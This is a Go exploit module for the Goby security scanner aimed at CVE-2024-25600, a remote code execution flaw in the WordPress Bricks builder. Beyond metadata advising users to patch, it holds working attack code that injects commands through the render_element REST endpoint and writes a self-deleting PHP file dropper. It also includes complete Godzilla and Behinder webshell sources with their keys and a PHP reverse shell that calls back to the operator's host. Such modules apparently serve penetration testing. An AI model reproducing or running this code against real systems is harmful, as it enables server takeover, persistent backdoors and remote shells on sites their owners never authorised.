package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "WordPress Bricks render_element Remote Code Execution Vulnerability (CVE-2024-25600)",
    "Description": "<p>WordPress Bricks is an innovative, community driven, and visual WordPress website builder that allows you to design unique, high-performance, and scalable websites.</p><p>WordPress Bricks has a remote code execution vulnerability, which allows attackers to execute code arbitrarily on the server side, write backdoors, gain server privileges, and then control the entire web server.</p>",
    "Product": "WordPress-Bricks",
    "Homepage": "https://bricksbuilder.io/",
    "DisclosureDate": "2024-02-21",
    "Author": "14m3ta7k",
    "FofaQuery": "body=\"/wp-content/themes/bricks\"",
    "GobyQuery": "body=\"/wp-content/themes/bricks\"",
    "Level": "3",
    "Impact": "<p>WordPress Bricks has a remote code execution vulnerability, which allows attackers to execute code arbitrarily on the server side, write backdoors, gain server privileges, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Currently, the manufacturer has released an upgrade patch. Please pay attention to the official website to download updates in time: <a href=\"https://bricksbuilder.io/\">https://bricksbuilder.io/</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "testPAOSDI963.php",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo 123; ?>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2024-25600"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress Bricks render_element 远程代码执行漏洞（CVE-2024-25600）",
            "Product": "wordpress-bricks",
            "Description": "<p>WordPress Bricks 一个创新的、社区驱动的、可视化的WordPress网站构建器，使您能够设计独特、高性能且可扩展的网站。</p><p>WordPress Bricks 存在远程代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、目前厂商已发布升级补丁，请关注官方网站及时下载更新：<a href=\"https://bricksbuilder.io/\" target=\"_blank\">https://bricksbuilder.io/</a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>WordPress Bricks 存在远程代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "WordPress Bricks render_element Remote Code Execution Vulnerability (CVE-2024-25600)",
            "Product": "WordPress-Bricks",
            "Description": "<p>WordPress Bricks is an innovative, community driven, and visual WordPress website builder that allows you to design unique, high-performance, and scalable websites.</p><p>WordPress Bricks has a remote code execution vulnerability, which allows attackers to execute code arbitrarily on the server side, write backdoors, gain server privileges, and then control the entire web server.</p>",
            "Recommendation": "<p>1. Currently, the manufacturer has released an upgrade patch. Please pay attention to the official website to download updates in time: <a href=\"https://bricksbuilder.io/\" target=\"_blank\">https://bricksbuilder.io/</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>WordPress Bricks has a remote code execution vulnerability, which allows attackers to execute code arbitrarily on the server side, write backdoors, gain server privileges, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-02-23",
    "PocId": "10927"
}`
	sendPayloadPXOZIUJDOASD := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		getNonceConfig := httpclient.NewGetRequestConfig("/")
		getNonceConfig.FollowRedirect = false
		getNonceConfig.VerifyTls = false
		indexResponse, err := httpclient.DoHttpRequest(hostInfo, getNonceConfig)
		if err != nil {
			return nil, err
		}
		nonces := regexp.MustCompile(`"nonce":"([a-f0-9]+)"`).FindStringSubmatch(indexResponse.RawBody)
		if len(nonces) < 2 {
			return nil, errors.New("未获取到nonce!")
		}
		executeCommandConfig := httpclient.NewPostRequestConfig("/wp-json/bricks/v1/render_element")
		executeCommandConfig.FollowRedirect = false
		executeCommandConfig.VerifyTls = false
		executeCommandConfig.Header.Store("Content-Type", "application/json")
		executeCommandConfig.Data = `{"postId": "1", "nonce": "` + nonces[1] + `", "element": {"name": "carousel", "settings": {"type": "posts", "query": {"useQueryEditor": true, "queryEditor": "throw new Exception(` + "`" + cmd + "`" + `);", "objectType": "post"}}}}`
		return httpclient.DoHttpRequest(hostInfo, executeCommandConfig)
	}

	writeFileXOPZIJASD := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		tempFilename := goutils.RandomHexString(6) + ".php"
		// 写文件,写完自删除
		_, err := sendPayloadPXOZIUJDOASD(hostInfo, `echo '<?php file_put_contents(\\$_POST[1], base64_decode(\\$_POST[2])); unlink(__FILE__); ?>' > `+tempFilename)
		if err != nil {
			return nil, err
		}
		b64Content := base64.StdEncoding.EncodeToString([]byte(content))
		writeFileConfig := httpclient.NewPostRequestConfig("/" + tempFilename)
		writeFileConfig.FollowRedirect = false
		writeFileConfig.VerifyTls = false
		writeFileConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		writeFileConfig.Data = "1=" + filename + "&2=" + strings.ReplaceAll(b64Content, "+", "%2B")
		if resp, err := httpclient.DoHttpRequest(hostInfo, writeFileConfig); resp != nil && resp.StatusCode == 200 {
			checkFileConfig := httpclient.NewGetRequestConfig("/" + filename)
			checkFileConfig.VerifyTls = false
			checkFileConfig.FollowRedirect = false
			return httpclient.DoHttpRequest(hostInfo, checkFileConfig)
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			response, _ := sendPayloadPXOZIUJDOASD(hostInfo, "echo "+checkString)
			return response != nil && strings.Contains(response.RawBody, "Exception: "+checkString)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				if resp, err := sendPayloadPXOZIUJDOASD(expResult.HostInfo, goutils.B2S(ss.Params["cmd"])); resp != nil && strings.Contains(resp.RawBody, "Exception: ") && strings.Contains(resp.RawBody, `<div class=\"bricks-element-placeholder`) {
					expResult.Output = strings.ReplaceAll(strings.ReplaceAll(resp.RawBody[strings.Index(resp.RawBody, "Exception: ")+11:strings.Index(resp.RawBody, `<div class=\"bricks-element-placeholder`)], "\\n", "\n"), "\\t", "    ")
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(ss.Params["webshell"])
				filename := goutils.RandomHexString(6) + ".php"
				content := goutils.B2S(ss.Params["content"])
				var tool, password string
				if webshell == "godzilla" {
					tool = "Godzilla v4.1"
					password = "pass 加密器：PHP_XOR_BASE64"
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				} else if webshell == "behinder" {
					tool = "Behinder v3.0"
					password = "rebeyond"
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "custom" {
					filename = goutils.B2S(ss.Params["filename"])
				}
				if resp, err := writeFileXOPZIJASD(expResult.HostInfo, filename, content); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
					if webshell != "custom" {
						expResult.Output += "Password: " + password + "\n"
						expResult.Output += "WebShell tool: " + tool + "\n"
						expResult.Output += "Webshell type: php"
					}
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				addr := godclient.GetGodServerHost()
				ip := net.ParseIP(addr)
				if ip != nil {
					addr = ip.String()
				} else {
					ips, err := net.LookupIP(addr)
					if err != nil {
						expResult.Output = err.Error()
						return expResult
					}
					addr = ips[0].String()
				}
				reverseContent := `<?php ignore_user_abort(true); pcntl_fork() && exit(); $sock = fsockopen("` + addr + `", ` + rp + `); $proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>`
				writeFileXOPZIJASD(expResult.HostInfo, goutils.RandomHexString(6)+".php", reverseContent)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			}
			return expResult
		}))
}
